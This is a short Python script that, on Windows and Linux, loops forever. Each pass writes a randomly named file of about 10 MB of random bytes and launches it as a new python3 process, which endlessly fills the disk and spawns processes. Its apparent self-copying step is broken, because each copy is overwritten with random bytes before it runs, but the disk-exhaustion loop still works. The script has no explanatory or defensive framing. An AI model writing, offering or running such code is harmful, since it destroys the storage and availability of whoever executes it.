import os
import random
import string
import subprocess
import sys

def generate_random_string(length):
    """Returns a random string of lowercase letters with the given length."""
    return ''.join(random.choices(string.ascii_lowercase, k=length))

def create_temp_file():
    """Creates a temporary Python file with the contents of the current script."""
    temp_file_name = generate_random_string(64) + '.py'
    with open(temp_file_name, 'w') as temp_file:
        temp_file.write(open(__file__).read())
    return temp_file_name

def write_random_bytes_to_file(file_name, num_bytes):
    """Writes a specified number of random bytes to a file."""
    with open(file_name, 'wb') as temp_file:
        temp_file.write(os.urandom(num_bytes))

def run_script(script_name):
    """Runs the specified Python script in a new process."""
    subprocess.Popen(['python3', script_name], shell=False)

if sys.platform.startswith('win'):
    while True:
        temp_script_name = create_temp_file()
        write_random_bytes_to_file(temp_script_name, 10_240_000)
        run_script(temp_script_name)

elif sys.platform.startswith('linux'):
    while True:
        temp_script_name = create_temp_file()
        write_random_bytes_to_file(temp_script_name, 10_240_000)
        run_script(temp_script_name)
